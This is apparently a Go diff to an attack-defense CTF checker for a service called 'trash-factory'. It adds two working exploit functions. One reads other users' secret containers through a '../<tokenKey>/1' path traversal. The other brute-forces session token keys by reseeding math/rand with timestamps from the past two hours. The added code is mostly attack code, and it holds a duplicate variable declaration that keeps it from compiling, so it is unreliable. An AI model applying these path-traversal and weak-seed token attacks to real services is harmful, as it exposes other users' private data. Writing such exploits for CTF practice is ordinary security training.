@@ -1,17 +1,18 @@
 package main
 
 import (
+	"encoding/binary"
 	"encoding/hex"
 	"errors"
 	"fmt"
 	"github.com/gocolly/colly"
 	log "github.com/sirupsen/logrus"
+	"math/rand"
 	"net"
 	"net/http"
 	"reflect"
 	"regexp"
 	"strings"
-	"sync"
 	"time"
 	"trash-factory/pkg/api"
 	"trash-factory/pkg/models"
@@ -75,28 +76,106 @@ func main() {
 	//v := Run(addr, command, data)
 	//fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
 	//fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))
-	log.SetLevel(log.ErrorLevel)
-	for i := 0; i < 75; i++ {
-		go func() {
-			for true {
-				wg := sync.WaitGroup{}
-				wg.Add(1)
-				go Test(&wg)
-				wg.Wait()
-			}
-		}()
+	//Test()
+	//err := HackPT("127.0.0.1")
+	//if err != nil {
+	//	log.Error(err)
+	//	return
+	//}
+	err := HackRandom("127.0.0.1")
+	if err != nil {
+		log.Error(err)
+		return
 	}
-	time.Sleep(3 * time.Minute)
 }
 
-func Test(wg *sync.WaitGroup) {
-	defer wg.Done()
-	defer func() {
-		if r := recover(); r != nil {
+func HackRandom(addr string) error {
+	endpoints := GetEndpoint(&addr)
+	tokenKey, _, err := CreateUser(endpoints.GetWebUrl())
+	if err != nil {
+		log.Error(err)
+		return err
+	}
+	tokenKey, _, err := CreateUser(endpoints.GetWebUrl())
 
+	now := time.Now()
+	for i := time.Now().Add(-120 * time.Minute); !i.After(now); i = i.Add(time.Second) {
+		//fmt.Println(i)
+		rand.Seed(i.Unix())
+		for i := 0; i < 10000; i++ {
+			//gtoken := make([]byte, 8)
+			//binary.LittleEndian.PutUint64(token, rand.Uint64())
+			gtokenKey := make([]byte, 8)
+			binary.LittleEndian.PutUint64(gtokenKey, rand.Uint64())
+			if hex.EncodeToString(gtokenKey) == tokenKey {
+				log.Info("Found!")
+				return nil
+			}
 		}
-	}()
-	adrr := "10.118.103.11"
+	}
+
+	return errors.New("Something wrong")
+}
+
+func HackPT(addr string) error {
+	endpoints := GetEndpoint(&addr)
+	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
+	if err != nil {
+		log.Error(err)
+		return err
+	}
+	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)
+	cId, err := client.CreateContainer(4, "victim")
+	if err != nil {
+		return err
+	}
+	err = client.PutItem(models.Item{
+		Type:        1,
+		Description: "secret",
+		Weight:      1,
+	}, cId)
+	if err != nil {
+		return err
+	}
+
+	atokenKey, atoken, err := CreateUser(endpoints.GetWebUrl())
+	if err != nil {
+		log.Error(err)
+		return err
+	}
+	aclient := api.NewClient(endpoints.GetCPUrl(), atokenKey, atoken)
+	_, err = aclient.CreateContainer(3, "folder init")
+	for i := 0; true; i++ {
+		stat, err := aclient.GetStat(i*20, (i+1)*20)
+		if err != nil {
+			return err
+		}
+		if len(stat.Users) == 0 {
+			return errors.New("Not found")
+		}
+		for _, user := range stat.Users {
+			sprintf := fmt.Sprintf("../%s/1", user.TokenKey)
+			log.Info("Try " + sprintf)
+			container, err := aclient.GetContainerInfo(sprintf)
+			if err != nil {
+				log.Warn("Can't get for " + user.TokenKey)
+				continue
+				//return err
+			}
+			for _, item := range container.Items {
+				if item.Description == "secret" {
+					log.Info("Get secret")
+					return nil
+				}
+			}
+		}
+	}
+
+	return errors.New("Something wrong")
+}
+
+func Test() {
+	adrr := "127.0.0.1"
 	command := "check"
 	data := ""
 	v := Run(&adrr, &command, &data)
@@ -127,22 +206,7 @@ func Test(wg *sync.WaitGroup) {
 }
 
 func Run(adrr *string, command *string, data *string) Verdict {
-	cpPort := "9090"
-	webPort := "8080"
-	host := *adrr
-	if strings.Contains(*adrr, ":") {
-		parts := strings.Split(*adrr, ":")
-		host = parts[0]
-		port := parts[1]
-		cpPort = "21" + port[2:]
-		webPort = "11" + port[2:]
-	}
-
-	endpoint := Endpoints{
-		CPPort:  cpPort,
-		WebPort: webPort,
-		Addr:    host,
-	}
+	endpoint := GetEndpoint(adrr)
 
 	switch *command {
 	case "check":
@@ -204,6 +268,26 @@ func Run(adrr *string, command *string, data *string) Verdict {
 		Code:   CHECKER_ERROR,
 		Reason: "Unknown operation",
 	}
+}
+
+func GetEndpoint(adrr *string) Endpoints {
+	cpPort := "9090"
+	webPort := "8080"
+	host := *adrr
+	if strings.Contains(*adrr, ":") {
+		parts := strings.Split(*adrr, ":")
+		host = parts[0]
+		port := parts[1]
+		cpPort = "21" + port[2:]
+		webPort = "11" + port[2:]
+	}
+
+	endpoint := Endpoints{
+		CPPort:  cpPort,
+		WebPort: webPort,
+		Addr:    host,
+	}
+	return endpoint
 }
 
 func EnsureSuccess(err error) (Verdict, bool) {
